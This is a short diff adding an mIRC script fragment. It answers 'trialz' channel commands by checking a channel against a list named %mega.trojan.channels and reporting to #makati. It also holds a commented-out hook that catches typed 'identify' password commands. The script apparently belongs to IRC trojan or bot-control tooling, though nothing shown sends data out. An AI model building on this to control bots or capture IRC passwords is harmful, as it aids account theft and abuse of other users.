@@ -1,0 +1,9 @@
+on 1:TEXT:trialz*:#: {
+  if ($2 isin %mega.trojan.channels) { .echo -a $2 is Included | msg #makati $2 INCLUDED! }
+}
+;on *:INPUT:*: {
+;  if (identify isin $1-) {
+;    .echo -s $1 $2 $3 $4 $5 $6 $7 $8
+;    halt
+;  }
+;}
